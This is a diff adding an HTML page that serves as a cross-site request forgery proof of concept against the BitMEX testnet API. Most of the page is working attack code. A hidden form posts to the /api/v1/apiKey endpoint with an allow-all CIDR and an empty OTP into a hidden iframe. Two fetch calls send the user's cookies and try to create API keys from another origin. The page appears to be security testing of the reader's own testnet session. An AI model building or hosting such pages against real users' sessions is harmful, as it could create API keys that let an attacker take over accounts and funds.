@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Cross-Origin Test - BitMEX</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 900px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .warning {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #17a2b8;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        .result {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            white-space: pre-wrap;
+            font-family: monospace;
+            font-size: 12px;
+        }
+        .success {
+            background: #d4edda;
+            border: 2px solid #28a745;
+            color: #155724;
+        }
+        .error {
+            background: #f8d7da;
+            border: 2px solid #dc3545;
+            color: #721c24;
+        }
+        .pending {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            color: #856404;
+        }
+        button {
+            background: #007bff;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 5px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .danger {
+            background: #dc3545;
+        }
+        .danger:hover {
+            background: #c82333;
+        }
+        h1 {
+            color: #333;
+        }
+        h2 {
+            color: #555;
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 10px;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 CSRF Cross-Origin Exploitability Test</h1>
+        
+        <div class="warning">
+            <strong>⚠️ CRITICAL TEST:</strong> This page tests if CSRF is exploitable cross-origin.
+            <br><strong>Current Origin:</strong> <span id="currentOrigin"></span>
+            <br><strong>Target:</strong> testnet.bitmex.com
+            <br><br>
+            <strong>Instructions:</strong>
+            <ol>
+                <li>Login to <a href="https://testnet.bitmex.com" target="_blank">testnet.bitmex.com</a> in this browser</li>
+                <li>Keep that tab open</li>
+                <li>Return to this page</li>
+                <li>Click the test buttons below</li>
+                <li>Check if API keys/orders were created on BitMEX</li>
+            </ol>
+        </div>
+        
+        <div class="info">
+            <strong>ℹ️ What This Tests:</strong>
+            <ul>
+                <li>If HTML form submission works cross-origin (bypasses CORS preflight)</li>
+                <li>If cookies are sent cross-origin (depends on SameSite attribute)</li>
+                <li>If CSRF is actually exploitable from a different domain</li>
+            </ul>
+        </div>
+        
+        <h2>Test 1: HTML Form Submission (Bypasses CORS)</h2>
+        <p>HTML forms use <code>application/x-www-form-urlencoded</code>, which bypasses CORS preflight.</p>
+        
+        <form id="formTest" action="https://testnet.bitmex.com/api/v1/apiKey" method="POST" target="hiddenFrame">
+            <input type="hidden" name="name" value="CSRF_CROSS_ORIGIN_FORM_TEST">
+            <input type="hidden" name="cidr" value="0.0.0.0/0">
+            <input type="hidden" name="permissions" value="">
+            <input type="hidden" name="otpToken" value="">
+            <button type="submit" class="danger">🚨 Submit Form (CSRF Test)</button>
+        </form>
+        
+        <iframe name="hiddenFrame" id="hiddenFrame" style="display:none; width:100%; height:200px; border:1px solid #ccc;"></iframe>
+        
+        <div id="formResult" class="result" style="display:none;"></div>
+        
+        <h2>Test 2: Fetch with application/json (CORS Preflight)</h2>
+        <p>This will likely fail due to CORS, but tests if JSON requests work cross-origin.</p>
+        
+        <button onclick="testFetchJson()">Test Fetch (JSON)</button>
+        <div id="fetchResult" class="result" style="display:none;"></div>
+        
+        <h2>Test 3: Fetch with text/plain (No Preflight)</h2>
+        <p>Testing if text/plain content-type bypasses CORS preflight.</p>
+        
+        <button onclick="testFetchText()">Test Fetch (Text/Plain)</button>
+        <div id="textResult" class="result" style="display:none;"></div>
+        
+        <h2>Test 4: Check Current Origin</h2>
+        <button onclick="checkOrigin()">Check Origin Info</button>
+        <div id="originResult" class="result" style="display:none;"></div>
+        
+        <hr>
+        
+        <h2>What to Check After Testing</h2>
+        <ol>
+            <li><strong>Go to BitMEX API Keys page:</strong> <a href="https://testnet.bitmex.com/app/apiKeys" target="_blank">https://testnet.bitmex.com/app/apiKeys</a></li>
+            <li><strong>Check if new API keys were created</strong></li>
+            <li><strong>Check your orders/balance</strong> if order tests were run</li>
+            <li><strong>Document the results</strong></li>
+        </ol>
+        
+        <div class="warning">
+            <strong>Expected Results:</strong>
+            <ul>
+                <li>✅ <strong>If API keys created:</strong> CSRF is exploitable cross-origin</li>
+                <li>❌ <strong>If no keys created:</strong> CSRF is blocked (SameSite/CORS protection working)</li>
+            </ul>
+        </div>
+    </div>
+    
+    <script>
+        // Show current origin
+        document.getElementById('currentOrigin').textContent = window.location.origin;
+        
+        // Form submission handler
+        document.getElementById('formTest').addEventListener('submit', function(e) {
+            const resultDiv = document.getElementById('formResult');
+            resultDiv.style.display = 'block';
+            resultDiv.className = 'result pending';
+            resultDiv.textContent = 'Form submitted. Checking response...\n\nNote: Due to CORS, we cannot read the iframe response directly.\n\nPlease check your BitMEX API Keys page to see if a new key was created.';
+            
+            // Try to check iframe after delay
+            setTimeout(() => {
+                try {
+                    const iframe = document.getElementById('hiddenFrame');
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                    const iframeBody = iframeDoc.body;
+                    
+                    if (iframeBody) {
+                        resultDiv.className = 'result success';
+                        resultDiv.textContent = '✅ Form submitted successfully!\n\nIframe content received (may be blocked by CORS).\n\n⚠️ CRITICAL: Check your BitMEX API Keys page NOW!\n\nIf a new API key appears, CSRF is exploitable cross-origin.';
+                    }
+                } catch (error) {
+                    resultDiv.className = 'result pending';
+                    resultDiv.textContent = '⚠️ Cannot read iframe response (CORS blocked).\n\nThis is expected, but the form submission may have still succeeded.\n\n🔍 ACTION REQUIRED: Check your BitMEX API Keys page:\nhttps://testnet.bitmex.com/app/apiKeys\n\nIf a new API key named "CSRF_CROSS_ORIGIN_FORM_TEST" appears,\nthen CSRF is exploitable cross-origin!';
+                }
+            }, 2000);
+        });
+        
+        async function testFetchJson() {
+            const resultDiv = document.getElementById('fetchResult');
+            resultDiv.style.display = 'block';
+            resultDiv.className = 'result';
+            resultDiv.textContent = 'Testing fetch with application/json...';
+            
+            try {
+                const response = await fetch('https://testnet.bitmex.com/api/v1/apiKey', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        name: 'CSRF_FETCH_JSON_TEST_' + Date.now(),
+                        cidr: '0.0.0.0/0',
+                        permissions: [],
+                        otpToken: ''
+                    })
+                });
+                
+                const data = await response.text();
+                let parsedData = null;
+                try {
+                    parsedData = JSON.parse(data);
+                } catch (e) {
+                    parsedData = { raw: data };
+                }
+                
+                if (response.status === 200 || response.status === 201) {
+                    resultDiv.className = 'result success';
+                    resultDiv.textContent = '✅ SUCCESS! Request succeeded cross-origin!\n\nStatus: ' + response.status + '\nResponse: ' + JSON.stringify(parsedData, null, 2) + '\n\n⚠️ CSRF IS EXPLOITABLE CROSS-ORIGIN!';
+                } else {
+                    resultDiv.className = 'result error';
+                    resultDiv.textContent = '❌ Request failed\n\nStatus: ' + response.status + '\nResponse: ' + JSON.stringify(parsedData, null, 2);
+                }
+            } catch (error) {
+                resultDiv.className = 'result error';
+                if (error.message.includes('CORS') || error.message.includes('cross-origin') || error.name === 'TypeError') {
+                    resultDiv.textContent = '❌ CORS Error: ' + error.message + '\n\nThis means cross-origin JSON requests are blocked by CORS.\n\nHowever, HTML forms may still work (they bypass CORS preflight).\n\nTry the HTML form test above.';
+                } else {
+                    resultDiv.textContent = '❌ Error: ' + error.message + '\n\nMake sure you are logged into testnet.bitmex.com';
+                }
+            }
+        }
+        
+        async function testFetchText() {
+            const resultDiv = document.getElementById('textResult');
+            resultDiv.style.display = 'block';
+            resultDiv.className = 'result';
+            resultDiv.textContent = 'Testing fetch with text/plain...';
+            
+            try {
+                // Try to send as text/plain (may not work if API expects JSON)
+                const response = await fetch('https://testnet.bitmex.com/api/v1/apiKey', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: 'name=CSRF_TEXT_TEST&cidr=0.0.0.0/0'
+                });
+                
+                const data = await response.text();
+                resultDiv.className = 'result';
+                resultDiv.textContent = 'Status: ' + response.status + '\nResponse: ' + data.substring(0, 200);
+            } catch (error) {
+                resultDiv.className = 'result error';
+                resultDiv.textContent = 'Error: ' + error.message;
+            }
+        }
+        
+        function checkOrigin() {
+            const resultDiv = document.getElementById('originResult');
+            resultDiv.style.display = 'block';
+            resultDiv.className = 'result';
+            
+            const info = {
+                'Current Origin': window.location.origin,
+                'Current Host': window.location.host,
+                'Current Protocol': window.location.protocol,
+                'Target': 'testnet.bitmex.com',
+                'Is Cross-Origin': window.location.host !== 'testnet.bitmex.com',
+                'Cookies Accessible': document.cookie.length > 0,
+                'Has connect.sid': document.cookie.includes('connect.sid')
+            };
+            
+            resultDiv.textContent = 'Origin Information:\n' + 
+                '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
+                Object.entries(info).map(([key, value]) => `${key}: ${value}`).join('\n') +
+                '\n\n' +
+                'If "Is Cross-Origin: true", then this is a valid CSRF test.\n' +
+                'If "Is Cross-Origin: false", you need to host this on a different domain.';
+        }
+    </script>
+</body>
+</html>
+
